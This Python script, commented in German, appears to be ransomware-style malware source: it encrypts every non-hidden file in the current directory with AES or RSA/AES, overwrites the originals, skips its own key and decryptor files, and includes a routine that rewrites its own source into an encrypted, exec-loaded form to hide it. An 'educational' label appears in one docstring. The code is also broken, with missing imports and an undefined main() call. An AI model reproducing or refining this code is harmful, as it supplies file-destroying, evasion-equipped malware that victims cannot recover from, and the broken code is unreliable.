#!/usr/bin/env python3

import os
import base64
import zlib
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet

# Code-Verschleierung hinzufügen
class CodeProtector:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def protect_code(self):
        # Eigenen Code einlesen
        with open(__file__, 'r') as f:
            code = f.read()
        
        # Code verschleiern
        compressed = zlib.compress(code.encode())
        encrypted = self.cipher.encrypt(base64.b85encode(compressed))
        
        # Neuen Code generieren
        protected_code = f"""

key = {self.key}
cipher = Fernet(key)
exec(zlib.decompress(base64.b85decode(cipher.decrypt({encrypted}))))
"""
        
        # Verschleierten Code speichern
        with open(__file__, 'w') as f:
            f.write(protected_code)


class SecureEncryption:
    """Verbesserte Verschlüsselungsklasse für Bildungszwecke"""
    
    MARKER = "ENCRYPTED"
    EXCLUDED_FILES = {
        "voldemort.py", 
        "thekey.key", 
        "decrypt.py", 
        "aes_key.enc",
        "encryption.log"
    }
    
    def __init__(self, log_file: str = "encryption.log"):
        """Initialisiert die Verschlüsselungsklasse"""
        self.setup_logging(log_file)
        self.backend = default_backend()
    
    def setup_logging(self, log_file: str) -> None:
        """Konfiguriert das Logging-System"""
        logging.basicConfig(
            filename=log_file,
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def generate_aes_key(self) -> bytes:
        """Generiert einen sicheren AES-Schlüssel"""
        try:
            key = os.urandom(32)
            self.logger.info("AES Schlüssel generiert")
            return key
        except Exception as e:
            self.logger.error(f"Fehler bei AES-Schlüsselgenerierung: {str(e)}")
            raise

    def aes_encrypt(self, key: bytes, data: bytes) -> bytes:
        """Verschlüsselt Daten mit AES"""
        try:
            iv = os.urandom(16)
            cipher = Cipher(
                algorithms.AES(key), 
                modes.CFB(iv), 
                backend=self.backend
            )
            encryptor = cipher.encryptor()
            encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
            return encrypted_data
        except Exception as e:
            self.logger.error(f"AES-Verschlüsselungsfehler: {str(e)}")
            raise

    def generate_rsa_key(self) -> rsa.RSAPrivateKey:
        """Generiert ein RSA-Schlüsselpaar"""
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,  # Erhöhte Schlüssellänge
                backend=self.backend
            )
            self.logger.info("RSA Schlüsselpaar generiert")
            return private_key
        except Exception as e:
            self.logger.error(f"Fehler bei RSA-Schlüsselgenerierung: {str(e)}")
            raise

    def rsa_encrypt(self, public_key: rsa.RSAPublicKey, data: bytes) -> bytes:
        """Verschlüsselt Daten mit RSA"""
        try:
            encrypted_data = public_key.encrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return encrypted_data
        except Exception as e:
            self.logger.error(f"RSA-Verschlüsselungsfehler: {str(e)}")
            raise

    def get_target_files(self) -> List[Path]:
        """Ermittelt zu verschlüsselnde Dateien"""
        try:
            return [
                Path(file) for file in os.listdir() 
                if os.path.isfile(file) 
                and file not in self.EXCLUDED_FILES 
                and not file.startswith('.')
            ]
        except Exception as e:
            self.logger.error(f"Fehler beim Dateiscan: {str(e)}")
            raise

    def check_if_encrypted(self, files: List[Path]) -> bool:
        """Prüft ob Dateien bereits verschlüsselt sind"""
        try:
            for file in files:
                with file.open("rb") as f:
                    if self.MARKER.encode() in f.read():
                        self.logger.warning(f"{file} bereits verschlüsselt")
                        return False
            return True
        except Exception as e:
            self.logger.error(f"Fehler bei Verschlüsselungsprüfung: {str(e)}")
            raise

    def encrypt_files(self, 
                     files: List[Path], 
                     encrypt_func: Callable[[bytes], bytes]) -> None:
        """Verschlüsselt die Dateien"""
        try:
            for file in files:
                with file.open("rb") as f:
                    contents = f.read()
                
                if self.MARKER.encode() in contents:
                    self.logger.warning(f"{file} übersprungen (bereits verschlüsselt)")
                    continue
                
                encrypted_data = encrypt_func(contents) + self.MARKER.encode()
                
                # Sichere Dateioperationen
                temp_file = file.with_suffix('.tmp')
                with temp_file.open("wb") as f:
                    f.write(encrypted_data)
                
                # Atomares Ersetzen
                temp_file.replace(file)
                self.logger.info(f"{file} erfolgreich verschlüsselt")
                
        except Exception as e:
            self.logger.error(f"Verschlüsselungsfehler: {str(e)}")
            raise

    def run(self):
        """Hauptprozess"""
        try:
            print("Wähle Verschlüsselungsalgorithmus:")
            print("1. AES")
            print("2. RSA")
            choice = input("Wahl (1 oder 2): ")

            files = self.get_target_files()
            if not self.check_if_encrypted(files):
                return

            if choice == "1":
                aes_key = self.generate_aes_key()
                with open("thekey.key", "wb") as key_file:
                    key_file.write(aes_key)
                encrypt_func = lambda data: self.aes_encrypt(aes_key, data)
                self.logger.info("AES-Modus gewählt")

            elif choice == "2":
                aes_key = self.generate_aes_key()
                rsa_key = self.generate_rsa_key()
                
                # Privaten Schlüssel speichern
                with open("thekey.key", "wb") as key_file:
                    key_file.write(
                        rsa_key.private_bytes(
                            encoding=serialization.Encoding.PEM,
                            format=serialization.PrivateFormat.PKCS8,
                            encryption_algorithm=serialization.NoEncryption()
                        )
                    )
                
                # AES-Schlüssel mit RSA verschlüsseln
                public_key = rsa_key.public_key()
                encrypted_aes_key = self.rsa_encrypt(public_key, aes_key)
                
                with open("aes_key.enc", "wb") as key_file:
                    key_file.write(encrypted_aes_key)
                    
                encrypt_func = lambda data: self.aes_encrypt(aes_key, data)
                self.logger.info("RSA/AES-Hybrid-Modus gewählt")

            else:
                self.logger.error("Ungültige Wahl")
                return

            self.encrypt_files(files, encrypt_func)
            self.logger.info("Verschlüsselung abgeschlossen")
            print("Verschlüsselung erfolgreich")

        except Exception as e:
            self.logger.critical(f"Kritischer Fehler: {str(e)}")
            print(f"Fehler: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    # Prüfen ob Code bereits verschleiert ist
    with open(__file__, 'r') as f:
        content = f.read()
    
    if 'CodeProtector' in content:
        # Code ist noch nicht verschleiert
        protector = CodeProtector()
        protector.protect_code()
    else:
        # Code ist bereits verschleiert, normal ausführen
        main()
